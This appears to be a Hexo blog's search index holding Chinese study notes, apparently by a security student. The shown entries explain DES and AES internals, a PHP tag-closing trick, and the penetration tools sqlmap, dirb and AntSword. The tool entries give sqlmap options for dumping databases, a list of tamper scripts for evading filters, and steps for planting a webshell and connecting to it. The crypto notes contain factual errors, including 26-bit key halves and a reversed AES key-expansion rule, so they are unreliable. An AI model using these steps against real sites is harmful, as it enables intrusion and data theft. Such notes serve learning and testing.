<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>密码学</title>
      <link href="/2023/10/11/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2023/10/11/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><blockquote><p>(1）消息（Message）：消息是指用语言、文字、数字、符号、图像、声音或其组合等方式记载或传递的有意义的内容。在密码学里，消息也称为信息 。</p><p>(2）明文（Plaintext）：未经过任何伪装或隐藏技术处理的消息称为明文。</p><p>(3）加密（Encryption）：利用某些方法或技术对明文进行伪装或隐藏的过程称为加密。</p><p>(4）密文（Cipher Text）：被加密的消息称为密文。</p><p>(5）解密（Decryption）：将密文恢复成原明文的过程或操作称为解密，解密也可称为脱密。</p><p>(6）加密算法（Encryption Algorithm）：将明文消息加密成密文所采用的一组规则或数学函数。</p><p>(7）解密算法（Decryption Algorithm ）：将密文消息解密成明文所采用的一组规则或数学函数。</p><p>(8）密钥（Key）：进行加密或解密操作所需要的秘密参数或关键信息 。在密码系统中，密钥分为私钥与公钥两种。私钥指必须保密的密钥，公钥指可以向外界公开的密钥。</p><p>(9）密码系统 （Cryptosystem ）：一个密码体制或密码系统是指由明文空间、密文空间、密钥空间、加密算法以及解密算法 组成的一个多元素集合体。</p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><p><strong>对称加密</strong>（Sysmmetric Cryptography）(使用相同密钥)</p><p><strong>非对称加密</strong>（Public-Key Cryptography，Asymmetric Cryptography）(使用不同密钥)</p><blockquote><p>这两者的区别是是否使用了相同的密钥，对称与非对称加密是可以通过密钥解出明文。因为明文不定，密文必定是不定长。</p></blockquote><h3 id="单向散列"><a href="#单向散列" class="headerlink" title="单向散列"></a>单向散列</h3><blockquote><p>单向散列可以是定长的，结合密码学的<strong>加解密技术和单向散列技术</strong>，又有了用于防止篡改的消息认证码技术，防止伪装的<strong>数字签名技术以及认证证书</strong>。</p></blockquote><h2 id="技术支持"><a href="#技术支持" class="headerlink" title="技术支持"></a>技术支持</h2><table><thead><tr><th>攻击方式</th><th>特征</th><th>对应技术</th></tr></thead><tbody><tr><td>窃听</td><td>机密性</td><td>对称、非对称加密</td></tr><tr><td>篡改</td><td>完整性</td><td>单向散列、消息认证码、数字签名</td></tr><tr><td>伪装</td><td>身份认证</td><td>消息认证、数字签名</td></tr><tr><td>否认</td><td>不可否认</td><td>数字签名</td></tr></tbody></table><h2 id="加密简介"><a href="#加密简介" class="headerlink" title="加密简介"></a>加密简介</h2><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>由于其<strong>速度快</strong>（根据相同密钥进行加解密），对称性加密通常在消息发送方需要加密大量数据时使用。对称性加密也称为<strong>密钥加密</strong>。</p><blockquote><p>安全的重点：密钥管理的安全性、加密算法的复杂性</p></blockquote><p>分组密码(归类对称加密)：每次只能处理<strong>特定长度</strong>的一块（block）数据的一类加解密算法。分组加密的典型算法：DES、3DES、AES</p><blockquote><p>分组密码的两个原则：</p><ul><li>扰乱原则：加解密变换过程中将明文、密钥以及密文之间的关系尽可能地复杂化，即<strong>将明文、密钥以及密文之间的依赖关系复杂化</strong>，使密码分析者尽可能无法利用这种依赖性。</li><li>扩散原则：将算法设计成明文每一比特的变化尽可能多地影响到输出密文序列的变化，以便<strong>隐蔽明文的统计特性</strong>。即<strong>明文和密钥中任何一比特值发生变化，都会在某种程度上影响到密文值的变化</strong>，以防止将明文或密钥分解成若干孤立的小部分，然后被各个击破。</li></ul></blockquote><h4 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h4><p>DES的名称为：<strong>数据加密标准</strong>(Data Encryption Standard)，是一种使用密钥加密的<strong>块算法</strong></p><blockquote><p>注意：</p><p>1.DES加密需要进行<strong>16轮</strong>的函数循环迭代。<br>2.密钥位64位，但是只有56位为有效位(其中8位为奇偶校验)。</p></blockquote><h5 id="全部操作步骤"><a href="#全部操作步骤" class="headerlink" title="全部操作步骤"></a>全部操作步骤</h5><blockquote><ol><li>输入64bit的明文进行IP置换，分成左右两个分支各为32bit, 左边：32bitL<del>0</del>,右边：32bitR<del>0</del></li><li>右分支：L<del>1</del> &#x3D; R<del>0</del> ，左分支：引入48bit 的密钥，R<del>1</del>&#x3D;L<del>0</del> 异或  f(R<del>0</del>,K<del>1</del>)  </li><li>相同的操作进行16次的运算循环，算出相应的，R<del>1</del>–R<del>16</del>，L<del>0</del>–L<del>16</del></li><li>最后在进行IP的逆序置换，将左右两个分支再次合并为64bit密文</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112144780.png"></p><h5 id="一次操作步骤"><a href="#一次操作步骤" class="headerlink" title="一次操作步骤"></a>一次操作步骤</h5><blockquote><p>(1)明文IP置换分组</p><blockquote><p>按固定表置换IP，后分组：Ln&#x3D;32bitRn&#x3D;32bit</p></blockquote><p>(2)F函数操作</p><blockquote><p>Rn的E盒拓展、s盒替代、P盒置换</p></blockquote><p>(3)密钥的形成</p><blockquote><p>PC-1置换、分组、循环移位、PC-2置换</p></blockquote><p>(4)Rn&#x3D;L<del>n-1</del> 异或  f(R<del>n-1</del>,K<del>1</del>)  </p><p>*第十六轮后需要进行逆序IP</p></blockquote><p>(1)明文IP置换分组</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112144054.png"></p><p>将IP进行上面的置换，再将置换后的IP分成L<del>0</del>&#x3D;32bit，R<del>0</del>&#x3D;32bit</p><blockquote><p>第一个位置代表原来IP矩阵中58位置的置换到1位置(该表是固定且有规律的)</p></blockquote><p>(2)F函数操作</p><ul><li>Rn的E拓展</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112144507.png"></p><p>按上面的E盒对32位的Rn拓展成48位Rn</p><ul><li><p>s盒替代</p><p>将E盒输出的48位替换压缩为32位</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112145010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112145319.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112145111.png"></p><p>将<strong>Rn拓展后再与K异或后</strong>的48bit分成8个6bit，对应8个s盒。然后转化为2进制计算：S<del>n</del>(h1….h6)对应S<del>i</del>表中的(h1,h6)行，(h2,h3,h4,h5)列，即S<del>n</del>(h1….h6) &#x3D; S<del>i</del>((h1,h6),(h2,h3,h4,h5))。**[行和列的开头为0]**</p><blockquote><p>例如：111001 为对应S<del>1</del>盒的6bit</p><p>即行为：(11) <del>2</del>&#x3D; 3</p><p>即列为：(1100)<del>2</del> &#x3D;  12</p><p>前6位bit替换成新的4bit：S<del>i</del>(3,12) &#x3D; 10 &#x3D; (1010)<del>2</del></p></blockquote><ul><li><p>P盒置换</p><p>将S盒替换后的32bit再按P盒置换，规则如IP置换相同</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112145552.png"></p></li></ul><p>(3)密钥的形成</p><ul><li><p>PC-1置换</p><p>按pc-1表进行置换</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112145047.png"></p><p>置换后发现64位密钥变成了56位(除去8位奇偶检验位)</p><ul><li>分组</li></ul><p>将PC-1置换后的56位分组，C<del>n</del>&#x3D;前26位，D<del>n</del>&#x3D;后26位</p><ul><li>循环移位</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112145302.png"></p><p>按上面的轮数使得C<del>n</del>和D<del>n</del>向左移动位数</p><ul><li>PC-2置换</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310112328041.png"></p><p>将循环移位后的内容按PC-2盒置换得到子密钥k<del>n</del></p><p>（4)R<del>n</del>&#x3D;L<del>n-1</del> 异或  f(R<del>n-1</del>,K<del>1</del>)  </p><p><a href="https://blog.csdn.net/u012391423/article/details/116610044">参考资料</a></p><p><a href="https://zhuanlan.zhihu.com/p/133516777">参考资料</a></p><h4 id="双重DES"><a href="#双重DES" class="headerlink" title="双重DES"></a>双重DES</h4><p>使用两个不同的密钥进行两次加密，期待密钥长度扩展为112bit，增加加密的安全性</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310160952500.png"></p><p>加密：C&#x3D;E<del>k2</del>[E<del>k1</del>[P]]</p><p>解密：P&#x3D;D<del>k1</del>[D<del>k2</del>[C]]</p><p>注意：该加密算法存在<strong>中间相遇攻击</strong></p><p>k1和k2的可能性为1&#x2F;2^56，使用明文对k1的所有可能密钥进行加密获得x1，使用密文对k2的所有可能密钥进行解密获得x2，对比x1和x2，如果存在一个中间相同的值则可以求出正确的k1和k2。</p><blockquote><p>即：D<del>k2</del>[C] &#x3D;  X &#x3D; E<del>k1</del>[P]时候k1和k2是正确的</p></blockquote><p>破译复杂度：2^57量级</p><h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>使用三个密钥对信息进行<strong>加密解密</strong>操作,当k1&#x3D;k3的时候成为双密钥三重DES</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310161015073.png"></p><p>加密：C&#x3D;E<del>k1</del>[D<del>k2</del>[E<del>k3</del>[P]]]</p><p>解密：P&#x3D;D<del>k3</del>[D<del>k2</del>[D<del>K1</del>[C]]]</p><p>破译复杂度10^52量级</p><p><a href="https://blog.csdn.net/Drifter_Galaxy/article/details/107703454">参考文献</a></p><h4 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h4><p>高级加密标准（<strong>A</strong>dvanced <strong>E</strong>ncryption <strong>S</strong>tandard）是区块加密标准。</p><h5 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h5><table><thead><tr><th align="center">AES</th><th align="center">密钥长度（32位比特字)</th><th align="center">分组长度(32位比特字)</th><th align="center">加密轮数</th></tr></thead><tbody><tr><td align="center">AES-128</td><td align="center">4</td><td align="center">4</td><td align="center">10</td></tr><tr><td align="center">AES-192</td><td align="center">6</td><td align="center">4</td><td align="center">12</td></tr><tr><td align="center">AES-256</td><td align="center">8</td><td align="center">4</td><td align="center">14</td></tr></tbody></table><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成<strong>16个字节</strong>，分别记为P &#x3D; P<del>0</del> P<del>1</del> … P<del>15</del> 和 K &#x3D; K<del>0</del>K<del>1</del> … K<del>15</del>。</p><p>明文分组用字节为单位的正方形矩阵描述，称为状态矩阵(按列排序)，如下：</p><table><thead><tr><th align="center">S<del>0</del></th><th align="center">S<del>4</del></th><th align="center">S<del>8</del></th><th align="center">S<del>12</del></th></tr></thead><tbody><tr><td align="center"><strong>S<del>1</del></strong></td><td align="center"><strong>S<del>5</del></strong></td><td align="center"><strong>S<del>9</del></strong></td><td align="center"><strong>S<del>13</del></strong></td></tr><tr><td align="center"><strong>S<del>2</del></strong></td><td align="center"><strong>S<del>6</del></strong></td><td align="center"><strong>S<del>10</del></strong></td><td align="center"><strong>S<del>14</del></strong></td></tr><tr><td align="center"><strong>S<del>3</del></strong></td><td align="center"><strong>S<del>7</del></strong></td><td align="center"><strong>S<del>11</del></strong></td><td align="center"><strong>S<del>15</del></strong></td></tr></tbody></table><p>128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特<strong>字</strong>。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥</p><table><thead><tr><th align="center">K<del>0</del></th><th align="center">K<del>4</del></th><th align="center">K<del>8</del></th><th align="center">K<del>12</del></th></tr></thead><tbody><tr><td align="center"><strong>K<del>1</del></strong></td><td align="center"><strong>K<del>5</del></strong></td><td align="center"><strong>K<del>9</del></strong></td><td align="center"><strong>K<del>13</del></strong></td></tr><tr><td align="center"><strong>K<del>2</del></strong></td><td align="center"><strong>K<del>6</del></strong></td><td align="center"><strong>K<del>10</del></strong></td><td align="center"><strong>K<del>14</del></strong></td></tr><tr><td align="center"><strong>K<del>3</del></strong></td><td align="center"><strong>K<del>7</del></strong></td><td align="center"><strong>K<del>11</del></strong></td><td align="center"><strong>K<del>15</del></strong></td></tr></tbody></table><p>W[0]&#x3D;K<del>0</del>K<del>1</del>K<del>2</del>K<del>3</del> </p><p>W[1]&#x3D;K<del>4</del>K<del>5</del>K<del>6</del>K<del>7</del></p><p>….</p><h5 id="全部操作步骤-1"><a href="#全部操作步骤-1" class="headerlink" title="全部操作步骤"></a>全部操作步骤</h5><blockquote><ol><li>密钥拓展</li><li>轮密钥加</li><li>字节替换</li><li>行移位</li><li>列混淆(<strong>加密最后一轮没有该步骤</strong>)</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310161623809.png" alt="步骤图"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310161141951.png" alt="S盒"></p><p><strong>(1)密钥拓展</strong></p><p>密钥拓展将一个128位的密钥扩展10次变成11个128位的密钥来用于接下来的轮密钥加操作</p><blockquote><p>拓展步骤：</p><p>当i为4的倍数的时候：W[i] &#x3D; W[i-4] 异或 W[i-1]</p><p>当i不为4的倍数的时候：W[i] &#x3D; W[i-4] 异或 T(W[i-1])</p><blockquote><p>T函数：</p><ul><li>字循环：将W[i-1]向左移动(即矩阵中向上移动一个字节)</li><li>字节替换：使用给定的S盒进行替换(第一个字节为行，第二个字节为列)</li><li>轮常量异或：将字节替换的结果与对应轮常量进行异或，i代表轮数</li></ul><table><thead><tr><th align="center">i</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th><th align="center">10</th><th align="center">11</th></tr></thead><tbody><tr><td align="center">RC[i]</td><td align="center">0x01</td><td align="center">0x02</td><td align="center">0x04</td><td align="center">0x08</td><td align="center">0x10</td><td align="center">0x20</td><td align="center">0x40</td><td align="center">0x80</td><td align="center">0x1B</td><td align="center">0x36</td><td align="center">0x6c</td></tr></tbody></table></blockquote><p>注意溢出操作：RC[i]  &#x3D; RC[i] 异或 0x1B</p><p><a href="https://dengwenyi88.github.io/blog/8a719895.html">参考</a></p></blockquote><p><strong>(2)轮密钥加</strong>(第一轮是与原始密钥矩阵)</p><p>明文矩阵和当前轮次的子密钥矩阵进行异或运算</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310161205796.webp"></p><p><strong>(3)字节替换</strong></p><p>参考提供的S盒对明文完成一个字节到另外一个字节的映射。其中第一个字节为行，第二个字节为列。</p><p>例如 ：0x01映射为0x7c</p><p><strong>(4)行移位</strong></p><blockquote><p>第一行不变</p><p>第二行左移1位</p><p>第三行左移2位</p><p>第三行左移3位</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310161207945.webp"></p><p><strong>(5)列混淆</strong></p><p>列混淆操作是 AES 算法中主要的扩散元素，对状态矩阵(明文分组)中的<strong>每列进行独立操作</strong>，它混淆了输入矩阵的每一列，使输入的每个字节都会影响到 4 个输出字节。【使用定义的固定矩阵进行列混淆】</p><p>(1)计算值为固定矩阵的行 * 状态矩阵的列为对应的位置值</p><p><img src="https://img-blog.csdnimg.cn/20210118193857372.png#pic_center"></p><p>其中b<del>0</del> &#x3D; 02 * a<del>0</del>  异或 03 * a<del>1</del> 异或 01 * a<del>2</del> 异或 01 *a<del>3</del></p><p><strong>下面是一些相关知识</strong></p><blockquote><p>AES固定的不可约多项式：m(x) &#x3D; x^8 + x^4 + x^3 + x + 1</p><p>十六进制{57}对应多项式：x^6 + x^4 + x^2+ x + 1</p><p><strong>加法计算步骤：</strong></p><p>例子：{57} + {83} &#x3D; {D4}</p><ol><li>转化</li></ol><blockquote><p>0x57 的二进制： (0101 0111)<del>2</del>  </p><p>多项式： (x^6 + x^4 + x^2+ x + 1) </p><p>0x83 的二进制： (1000 0011)<del>2</del>  </p><p>多项式： (x^7 + x + 1)</p></blockquote><ol start="2"><li>异或操作</li></ol><blockquote><p>多项式异或：(x^6 + x^4 + x^2+ x + 1) 异或 (x^7 + x + 1) &#x3D;(x^7 + x^6 + x^4 + x^2)</p><p>二进制异或：</p><p>0101 0111</p><p><u>1000 0011</u></p><p>1101 0100 </p></blockquote><ol start="3"><li>转成16进制</li></ol><blockquote><p>(1101 0100)<del>2</del> &#x3D; {D4}</p></blockquote><p><strong>乘法计算步骤：</strong></p><p>例子：{57} * {83} &#x3D; {C1}</p><ol><li>转化</li></ol><blockquote><p>0x57 的二进制： (0101 0111)<del>2</del>  </p><p>多项式： (x^6 + x^4 + x^2+ x + 1) </p><p>0x83 的二进制： (1000 0011)<del>2</del>  </p><p>多项式： (x^7 + x + 1)</p></blockquote><ol start="2"><li>相乘</li></ol><p>  (x^6 + x^4 + x^2 + x + 1)  *  (x^7 + x + 1) &#x3D; (x^13 + x^11 + x^9 + x^8 + x^7)  异或  (x^7 + x^5  + x^3 + x^2 + x)  异或  (x^6 + x^4 + x^2 + x + 1)  &#x3D; (x^13 + x^11 + x^9 + x^8 + x^6 + x^5 + x^4 + x^3 + 1)</p><p>  <strong>多项式最高次幂≥8需要进行模不可约多项式运算</strong><br>  (x^13 + x^11 + x^9 + x^8 + x^6 + x^5 + x^4 + x^3 + 1) mod ( x^8 + x^4 + x^3 + x + 1) &#x3D; x^7 + x^6 + 1</p><blockquote><p>将多项式转化成二进制进行除法运算得出余数为所求结果</p><p>(x^13 + x^11 + x^9 + x^8 + x^6 + x^5 + x^4 + x^3 + 1)  &#x3D; （10101101111001)<del>2</del></p><p>( x^8 + x^4 + x^3 + x + 1)  &#x3D; (100011011)<del>2</del></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202310162215996.jpg"></p></blockquote></blockquote><p><a href="https://zhuanlan.zhihu.com/p/480298447#:~:text=%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B0%B1%E6%98%AF%E6%8A%8A%E4%B9%8B%E5%89%8D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%93%8D%E4%BD%9C%E6%95%B4%E5%90%88%E8%B5%B7%E6%9D%A5%EF%BC%8C%E8%BF%99%E9%87%8C%E8%BF%98%E6%98%AF%E6%8B%BF%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84,AES-128%E4%BD%8D%E3%80%81ECB%E6%A8%A1%E5%BC%8F%20%E4%B8%BE%E4%BE%8B%EF%BC%8C128%E4%BD%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E5%8A%A0%E5%AF%86%E8%BD%AE%E6%95%B0%E6%98%AF10%E8%BD%AE%EF%BC%8C%E5%85%B6%E4%B8%AD%E8%BD%AE%E5%AF%86%E9%92%A5%E5%8A%A0%E7%B4%AF%E8%AE%A111%E6%AC%A1%EF%BC%8C%E9%80%9A%E8%BF%87%E4%B9%8B%E5%89%8D%E7%9A%84%E4%BB%8B%E7%BB%8D%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93%E5%8F%AA%E6%9C%89%E8%BD%AE%E5%AF%86%E9%92%A5%E4%B8%AD%E4%BC%9A%E7%94%A8%E5%88%B0%E5%AF%86%E9%92%A5%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%AF%86%E9%92%A5%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%BA128%E4%BD%8D16%E5%AD%97%E8%8A%82%E7%BB%8F%E8%BF%8710%E6%AC%A1%E6%89%A9%E5%B1%95%E4%B9%8B%E5%90%8E%E6%AD%A3%E5%A5%BD%E6%BB%A1%E8%B6%B311%E6%AC%A1%E8%BD%AE%E5%AF%86%E9%92%A5%E5%8A%A0%E7%9A%84%E9%9C%80%E8%A6%81%E3%80%82">AES参考</a></p><p><a href="https://blog.csdn.net/weixin_46395886/article/details/112793345">AES参考</a></p><p><a href="https://www.bilibili.com/video/BV1MU4y1R78n/?spm_id_from=333.337.search-card.all.click&vd_source=c8b3856a0cd807d6be613d8a200b9b49">列混淆计算视频</a></p><p><a href="https://blog.csdn.net/weixin_46395886/article/details/112793345">列混淆推算及步骤</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>积累一些理解</title>
      <link href="/2023/06/09/%E7%A7%AF%E7%B4%AF/"/>
      <url>/2023/06/09/%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP闭合"><a href="#PHP闭合" class="headerlink" title="PHP闭合"></a>PHP闭合</h2><h3 id="无法使用”-”"><a href="#无法使用”-”" class="headerlink" title="无法使用”;”"></a>无法使用”;”</h3><blockquote><p>在PHP中，最后一个语句可用不用;来结尾的，所以有时候可用直接使用?&gt;进行闭合</p></blockquote><p>如下面代码可用执行：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token number">1</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token number">2</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://www.freebuf.com/articles/web/359345.html">PHP中的代码执行，命令执行与常见bypass技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> 理解集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 理解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具利用</title>
      <link href="/2023/06/04/Tool/"/>
      <url>/2023/06/04/Tool/</url>
      
        <content type="html"><![CDATA[<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入</p><blockquote><p>kali使用：sqlmap -u “url” (–data&#x3D;” xxx”) 参数</p></blockquote><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><blockquote><ol><li><code>--dbs</code> 目标服务器中有什么数据库，常用，直接用<code>--dbs</code></li><li><code>--tables</code> 目标数据库有什么表，常用，直接用<code>--tables</code></li><li><code>--columns</code> 目标表中有什么列，常用，直接用<code>--colums</code></li><li><code>-D DB</code> 指定从某个数据库查询数据，常用。例： <code>-D admindb</code></li><li><code>-T TBL</code> 指定从某个表查询数据，常用。例： <code>-T admintable</code></li><li><code>-C COL</code> 指定从某个列查询数据，常用。例： <code>-C username</code></li><li><code>--dump</code> 查询指定范围的全部数据。例： <code>--dump -D admin -T admin -C username</code></li><li><code>--where=DUMPWHERE</code> 在dump表时使用where限制条件。</li><li><code>--batch</code> 批处理，在检测过程中会问用户一些问题，使用这个参数统统使用默认值。</li></ol></blockquote><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/80628392">sqlmap参数参考</a></p><blockquote><p>tamper是sqlmap提供的饶过脚本，使sqlmap更加强有力的渗透</p><p>tamper使用：–tamper  “脚本名称”</p><p>脚本在kali下的路径：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;</p></blockquote><h3 id="tamper脚本分类说明"><a href="#tamper脚本分类说明" class="headerlink" title="tamper脚本分类说明"></a>tamper脚本分类说明</h3><blockquote><p>1、apostrophemask.py ：将引号替换为UTF-8,用于过滤单引号。安全</p><p>2、base64encode.py :替换为base64编码。app</p><p>3、multiplespaces.py:围绕SQL关键字添加多个空格。dom</p><p>4、space2plus.py:用+号替换为空格。ide</p><p>5、nonrecursivereplacement.py:做为双重查询语句，用双重语句替代预约义的SQL关键字（适用于很是弱的自定义过滤器，例如将SELECT替换为空）。函数</p><p>6、space2randomblank.py:将空格替换为其余有效字符。post</p><p>7、unionalltounion.py:将UNION ALL SELECT替换为UNION SELECT。测试</p><p>8、securespher.py:追加特制的字符串。</p><p>9、space2hash.py:将空格替换为#号，并添加一个随机字符串和换行符。</p><p>10、space2mssqlblank.py（mssql）：将空格替换为其余空符号。</p><p>11、spce2mssqlhash.py:将空格替换为#号，并添加一个换行符。</p><p>12、between.py:用NOT BETWEEN 0 AND 替换大于号（&gt;）,用BETWEN AND 替换等号(&#x3D;)。</p><p>13、percentage.py:ASP容许在每一个字符前面添加一个%号1.</p><p>14、sp_password.py:从DBMS日志的自动模糊处理的有效载荷中追加sp_password。</p><p>15、charencode.py:对给定的Payload所有字符使用URL编码（不处理已经编码的字符）。</p><p>16、randomcase.py:随机大小写。</p><p>17、charunicodeencode.py:字符串unicode编码。</p><p>18、space2comment.py:将空格替换为&#x2F;**&#x2F;。</p><p>19、equaltolike.py:将等号替换为like。</p><p>20、greatest.py:绕过对”&gt;”的过滤，用GREATEEST替换大于号。</p><p>以上测试经过的数据库类型和版本：</p><p>mysql4、mysql5.0和mysql5.5</p><p>orcale10g</p><p>postgresql8.3、postgresql 8.4和postgresql9.0</p><p>21、ifnull2ifisnull.py:绕过对IFNULL的过滤，替换相似IFNULL（A,B)为IF（ISNULL(A),B,A)。</p><p>测试经过的数据库类型和版本为MySQL 5.0和MySQL 5.5</p><p>22、modsecurityversioned.py:过滤空格，使用MySQL内联注释的方式进行注入。</p><p>测试经过的数据库类型和版本为MySQL5.0</p><p>23、space2mysalblank.py:将空格替换为其它空白符号（适用于MySQL)</p><p>测试经过的数据库类型和版本为MySQL5.1</p><p>24、modesecurityzeroversioned.py:使用MySQL内联注释的方式（&#x2F;<em>！00000</em>&#x2F;）</p><p>测试经过的数据库类型和版本为MySQL 5.0</p><p>25、space2mysqldash.py:将空格替换为–，并添加一个换行符。</p><p>26、bluecoat.py:在SQL语句以后用有效的随机空白符替换空格符，随后用LIKE替换等于号。</p><p>测试经过的数据库类型和版本为MySQL5.1和SGOS</p><p>27、versionedkeywords.py：注释绕过。</p><p>28、halfversionedmorekeywords.py:当数据库为MySQL时绕过防火墙，在每一个关键字以前添加MySQL版本注释。</p><p>测试经过的数据库类型和版本为MySQL 4.0.18和MySQL 5.0.22</p><p>29、space2morehash.py:将空格替换为#号，并添加一个随机字符串和换行符。</p><p>测试经过的数据库类型和版本为MySQL5.1.14</p><p>30、apostrophenullencode.py:用非法双字节unicode字符替换单引号。</p><p>31、appendnullbyte.py:在有效负荷的结束位置加载零字节字符编码。</p><p>32、chardoubleeencode.py:对给定的Payload所有字符使用双重URL编码（不处理已编码的字符）。</p><p>33、unmagicquotes.py:用一个多字节组合（%bf%27）和末尾通用注释也一块儿替换空格。</p><p>34、randomcomments.py:用&#x2F;**&#x2F;分割SQL关键字。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309121602654.png"></p><p><a href="https://blog.csdn.net/whatday/article/details/54774043">tamper绕过参考</a></p><h2 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h2><p>dirb是一个基于字典的web目录扫描工具</p><blockquote><p>kali使用：dirb  “url”  字典  参数…</p><p>字典路径：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb</p></blockquote><h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><blockquote><ol><li><p>-a <agent_string>：指定您的定制USER_AGENT。</p></li><li><p>-c <cookie_string>：为HTTP请求设置cookie。</p></li><li><p>-f：精细调整NOT_FOUND（404）检测。</p></li><li><p>-H <header_string>：将自定义标头添加到HTTP请求。</p></li><li><p>-i：使用不区分大小写的搜索。</p></li><li><p>-l：找到时打印“ Location”标题。</p></li><li><p>-N <nf_code>：忽略此HTTP代码的响应。</p></li><li><p>-o &lt;输出文件&gt;：将输出保存到磁盘。</p></li><li><p>-p &lt;代理[：端口]&gt;：使用此代理。（默认端口为1080）</p></li><li><p>-P &lt;proxy_username：proxy_password&gt;：代理身份验证。</p></li><li><p>-r：不要递归搜索。</p></li><li><p>-R：交互式递归。（询问每个目录）</p></li><li><p>-S：静默模式。不要显示经过测试的单词。（用于哑终端）</p></li><li><p>-t：不要在网址上强制使用结尾的“ &#x2F;”。</p></li><li><p>-u &lt;用户名：密码&gt;：HTTP身份验证。</p></li><li><p>-v：也显示NOT_FOUND页。</p></li><li><p>-w：不要在警告消息上停止。</p></li><li><p>-X &lt;扩展名&gt; &#x2F; -x &lt;扩展名文件&gt;：在每个单词后加上该扩展名。</p></li><li><p>-z：添加毫秒延迟，以免导致过多的Flood。</p></li></ol></blockquote><h2 id="AntSword"><a href="#AntSword" class="headerlink" title="AntSword"></a>AntSword</h2><p>中国蚁剑是跨平台网站管理工具</p><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><blockquote><ol><li>查看是否有可以放入shell的地方</li><li>可以放置shell进行切入</li><li>登录蚁剑，连接的url为shell存放的地方</li><li>如果shell为PHP类型，且用post之类的传值，则密码为post的value值</li></ol></blockquote><p><a href="https://www.yuque.com/antswordproject/antsword/wfgguz">蚁剑使用文档</a></p><p><a href="https://www.freebuf.com/sectool/317346.html">蚁剑的正确使用</a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/12078206.html">一句话木马原理和变形</a></p><p><a href="https://blog.csdn.net/BYZY1314/article/details/127792228">一句话木马的使用</a></p><h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" 